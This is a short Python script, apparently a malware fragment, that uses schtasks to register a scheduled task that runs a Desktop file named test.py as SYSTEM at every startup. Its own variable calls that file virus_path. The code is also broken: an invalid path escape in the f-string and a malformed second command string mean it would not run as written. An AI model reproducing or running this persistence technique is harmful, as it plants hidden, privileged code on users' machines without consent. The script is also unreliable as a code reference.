import os
import getpass

cwd = os.getcwd()
user = getpass.getuser()
c_path = "C:\\Users\\" + user + "\\"
startup_path = c_path + "AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
desktop_path = c_path + "Desktop\\"
virus_path = desktop_path + "test.py"

# pathpath = ('"cmd /c "schtasks /create /tn "test" /sc onstart /ru system /tr "C:\Users\" + user + "\Desktop\test.py" /va /f"')

passpath = f"""
'cmd /c "schtasks /create /tn "test" /sc onstart /ru system /tr "C:\\Users\\{user}\\Desktop\\test.py" /va /f"'
"""

print (passpath)

os.system(f'cmd /c "schtasks /create /tn "test" /sc onstart /ru system /tr "C:\Users\{user}\Desktop\test.py" /va /f"')
print ("done")
os.system(passpath)
